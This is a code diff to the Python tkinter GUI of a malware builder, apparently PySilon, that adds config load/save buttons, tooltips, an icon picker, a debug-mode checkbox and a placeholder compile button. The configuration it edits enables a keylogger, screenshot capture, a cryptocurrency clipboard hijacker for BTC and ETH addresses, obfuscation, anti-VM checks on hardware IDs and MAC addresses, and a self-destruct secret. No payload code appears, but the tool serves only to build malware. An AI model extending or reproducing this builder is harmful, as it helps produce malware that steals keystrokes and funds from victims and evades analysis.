@@ -1,5 +1,6 @@
 import tkinter as tk
 from tkinter import ttk
+from tkinter import filedialog
 import random
 import os
 import pyperclip
@@ -46,7 +47,7 @@ class Builder:
             'directory_name': '',
             'executable_name': '',
             'implode_secret': '',
-            'icon_path': '',
+            'icon_path': 'resources/icons/default_icon.ico',
             'functionalities': {
                 'keylogr': True,
                 'scrnsht': True,
@@ -110,6 +111,7 @@ class Builder:
                 'HardwareIDsCheck': True,
                 'MacAddressesCheck': True
             },
+            'debug_mode': False,
             'crypto_clipper': {
                 'BTC': '',
                 'ETH': '',
@@ -145,6 +147,14 @@ class Builder:
         y = self.master.winfo_y() + dy
         self.master.geometry(f"+{x}+{y}")
 
+    def get_file_path(self, file_types, initial_directory=os.getcwd()):
+        root2 = tk.Tk()
+        root2.withdraw()
+        root2.attributes('-topmost', True)
+        open_dir = filedialog.askopenfilename(filetypes=file_types, initialdir=initial_directory)
+        root2.destroy()
+        return open_dir
+
     def create_header(self):
         self.header = tk.Canvas(self.master, bd=0, highlightthickness=0, bg='#191919')
         self.header.place(
@@ -168,12 +178,12 @@ class Builder:
             bd=0,
             cursor='hand2',
             relief=tk.FLAT,
-            font=tkFont.Font(
-                family='Consolas', 
-                size=2),
             disabledforeground='white',
             command=self.exit_app
             )
+        
+        self.close_button.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['close']))
+        self.close_button.bind("<Leave>", self.hide_tooltip)
         
         self.header.create_window(
             7,
@@ -191,12 +201,12 @@ class Builder:
             bd=0,
             cursor='hand2',
             relief=tk.FLAT,
-            font=tkFont.Font(
-                family='Consolas', 
-                size=2),
             disabledforeground='white',
             command=self.minimize_app
             )
+        
+        self.minimize_button.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['minimize']))
+        self.minimize_button.bind("<Leave>", self.hide_tooltip)
         
         self.header.create_window(
             22,
@@ -204,6 +214,52 @@ class Builder:
             height=10,
             width=10,
             window=self.minimize_button, 
+            anchor='nw')
+        
+        self.blue_circle = tk.PhotoImage(file='resources/assets/builder_elements/blue_circle.png')
+        self.config_load_button = tk.Button(
+            self.header,
+            text='',
+            image=self.blue_circle,
+            bd=0,
+            cursor='hand2',
+            relief=tk.FLAT,
+            disabledforeground='white',
+            command=lambda:self.load_configuration(self.get_file_path([('Configuration files', '.json')], '.'))
+            )
+        
+        self.config_load_button.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['config_load']))
+        self.config_load_button.bind("<Leave>", self.hide_tooltip)
+        
+        self.header.create_window(
+            45,
+            5,
+            height=10,
+            width=10,
+            window=self.config_load_button, 
+            anchor='nw')
+        
+        self.green_circle = tk.PhotoImage(file='resources/assets/builder_elements/green_circle.png')
+        self.config_save_button = tk.Button(
+            self.header,
+            text='',
+            image=self.green_circle,
+            bd=0,
+            cursor='hand2',
+            relief=tk.FLAT,
+            disabledforeground='white',
+            command=lambda:self.save_configuration(False, from_window=self.current_window)
+            )
+        
+        self.config_save_button.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['config_save']))
+        self.config_save_button.bind("<Leave>", self.hide_tooltip)
+        
+        self.header.create_window(
+            60,
+            5,
+            height=10,
+            width=10,
+            window=self.config_save_button, 
             anchor='nw')
         
         self.header.create_text(
@@ -232,7 +288,7 @@ class Builder:
 
         self.apply_rounded_corners('bottom')
         
-        self.canvas.create_text(
+        self.tooltip_hint = self.canvas.create_text(
             10, 
             452, 
             text='Hover on elements to get more info.', 
@@ -462,7 +518,9 @@ class Builder:
                     'scrnman': self.cbvar_scrnman.get()
                 }
             case 3:
-                pass
+                self.malware_configuration['obfuscation']['enabled'] = self.cbvar_obfuscation.get()
+                self.malware_configuration['anti_vm']['enabled'] = self.cbvar_antivm.get()
+                self.malware_configuration['debug_mode'] = self.cbvar_debugmode.get()
 
         with open('configuration.json' if not temporary else 'resources/assets/configuration.tmp', 'w', encoding='utf-8') as configuration_file:
             configuration_file.write(json.dumps(self.malware_configuration, indent=4))
@@ -478,8 +536,8 @@ class Builder:
             self.corners_image = ImageTk.PhotoImage(Image.open(f'resources/assets/builder_elements/corners.png'))
             self.canvas.create_image(0, 440, image=self.corners_image, anchor=tk.NW)
 
-    def load_configuration(self, temporary):
-        with open('configuration.json' if not temporary else 'resources/assets/configuration.tmp', 'r', encoding='utf-8') as configuration_file:
+    def load_configuration(self, path=False):
+        with open('configuration.json' if path else 'resources/assets/configuration.tmp' if not path else path, 'r', encoding='utf-8') as configuration_file:
             self.malware_configuration = json.loads(''.join(configuration_file.readlines()))
     
     def write_configuration(self, temporary=True, close=False):
@@ -549,6 +607,7 @@ class Builder:
         os.system('start https://github.com/mategol/PySilon-malware/releases')
     
     def show_tooltip(self, event, tooltip_text):
+        self.canvas.delete(self.tooltip_hint)
         self.tooltip_label = tk.Label(self.canvas, text=tooltip_text, relief=tk.RIDGE, borderwidth=0, background="#0A0A10")
         self.tooltip_label.place(
             x=10, 
@@ -557,9 +616,28 @@ class Builder:
 
     def hide_tooltip(self, event):
         self.tooltip_label.place_forget()
+        self.tooltip_hint = self.canvas.create_text(
+            10, 
+            452, 
+            text='Hover on elements to get more info.', 
+            fill='white', 
+            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['canvas']['tooltips']['font_size']), 
+            anchor=tk.SW)
 
     def paste_token(self):
         self.token_entry.insert(0, pyperclip.paste())
+
+    def change_icon(self):
+        new_icon = self.get_file_path([('Icon files', '.jpg .png .ico')], 'resources/icons/default/Windows-10/popular')
+        if new_icon == '': return
+        Image.open(new_icon).resize((100, 100)).save('icon.png', format='PNG')
+        self.icon_photo = tk.PhotoImage(file='icon.png')
+        self.icon_button['image'] = self.icon_photo
+        self.malware_configuration['icon_path'] = new_icon
+
+    def compile(self):
+        self.save_configuration(True, from_window=3)
+        print('compile')
 
     def general_settings(self):
         self.general_settings_button['state'] = tk.DISABLED
@@ -572,7 +650,7 @@ class Builder:
         if self.current_window > 0: self.save_configuration(True, from_window=self.current_window)
         self.current_window = 1
         self.new_background(1)
-        self.load_configuration(True)
+        self.load_configuration(False)
 
         # BOT Token
         self.canvas.create_text(
@@ -782,7 +860,7 @@ class Builder:
         self.save_configuration(True, from_window=self.current_window)
         self.current_window = 2
         self.new_background(2)
-        self.load_configuration(True)
+        self.load_configuration(False)
 
         x_start, y_start, x_delta, y_delta = builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['checkboxes']['x_start'], builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['checkboxes']['y_start'], builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['checkboxes']['x_delta'], builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['checkboxes']['y_delta']
 
@@ -1131,6 +1209,7 @@ class Builder:
         self.compiling_settings_button['relief'] = 'flat'
         self.save_configuration(True, from_window=self.current_window)
         self.current_window = 3
+        self.load_configuration(False)
         self.new_background(3)
 
         self.time_check = time.time()
@@ -1179,6 +1258,55 @@ class Builder:
             window=self.cb_antivm, 
             anchor='w')
 
+        self.cbvar_debugmode = tk.BooleanVar(value=False)
+        self.cb_debugmode = tk.Checkbutton(
+            self.canvas,
+            selectcolor='#0A0A10',
+            text='debug mode',
+            font=(
+                'Consolas', 
+                builder_configuration['window_sizes'][builder_configuration['use_sizes']]['compiling_settings']['font_size']),
+            variable=self.cbvar_debugmode,
+            onvalue=True,
+            offvalue=False
+        )
+        self.cb_debugmode.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['debugmode']))
+        self.cb_debugmode.bind("<Leave>", self.hide_tooltip)
+
+        self.canvas.create_window(
+            100,
+            205,
+            window=self.cb_debugmode, 
+            anchor='w')
+
+        self.canvas.create_text(
+            400,
+            125,
+            text='Icon:', 
+            fill='white', 
+            font=(
+                'Consolas', 
+                builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['font_size']), 
+            anchor=tk.W)
+        
+        self.icon_photo = ImageTk.PhotoImage(Image.open('resources/icons/default_icon.png').resize((100, 100)))
+        self.icon_button = tk.Button(self.canvas, relief='flat', cursor='hand2', image=self.icon_photo, state=tk.NORMAL, width=100, height=100, command=self.change_icon)
+        self.icon_button.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['icon']))
+        self.icon_button.bind("<Leave>", self.hide_tooltip)
+        self.canvas.create_window(
+            400,
+            140,
+            window=self.icon_button,
+            anchor='nw')
+        
+        self.compile_button = tk.Button(self.canvas, cursor='hand2', text='Compile', font='Consolas', state=tk.NORMAL, command=self.compile)
+        self.compile_button.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['compile']))
+        self.compile_button.bind("<Leave>", self.hide_tooltip)
+        self.canvas.create_window(
+            690,
+            450,
+            window=self.compile_button,
+            anchor='se')
 
 
 
